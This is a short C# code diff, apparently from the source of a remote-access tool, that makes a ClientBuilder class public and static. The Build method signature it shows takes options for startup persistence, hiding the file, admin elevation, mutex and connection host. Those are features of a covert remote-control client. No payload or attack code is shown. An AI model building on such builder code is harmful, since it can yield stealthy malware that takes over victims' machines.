@@ -6,7 +6,7 @@ using xServer.Core.Encryption;
 
 namespace xServer.Core.Build
 {
-    class ClientBuilder
+    public static class ClientBuilder
     {
         public static void Build(string output, string host, string password, string installsub, string installname, string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay, int installpath, bool adminelevation, string iconpath, string[] asminfo, string version)
         {
